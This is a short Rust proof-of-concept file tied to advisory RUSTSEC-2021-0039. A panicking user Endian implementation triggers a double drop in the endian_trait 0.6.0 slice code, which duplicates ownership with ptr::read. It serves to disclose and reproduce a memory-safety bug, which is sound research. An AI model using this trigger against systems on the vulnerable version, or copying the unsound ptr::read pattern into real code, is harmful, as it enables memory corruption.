//! Published Rudra-PoC 0090 for RUSTSEC-2021-0039 (`endian_trait` 0.6.0).
//!
//! A safe user `Endian` implementation panics after the slice implementation
//! has duplicated ownership with `ptr::read`, producing a double drop.

#![forbid(unsafe_code)]

use endian_trait::Endian;

#[derive(Debug)]
struct Foo(Box<Option<i32>>);

impl Endian for Foo {
    fn to_be(self) -> Self {
        eprintln!("triggering panic: {}", self.0.as_ref().as_ref().unwrap());
        self
    }

    fn to_le(self) -> Self { self }
    fn from_be(self) -> Self { self }
    fn from_le(self) -> Self { self }
}

fn main() {
    let mut values = [Foo(Box::new(None))];
    let _ = (&mut values[..]).to_be();
}
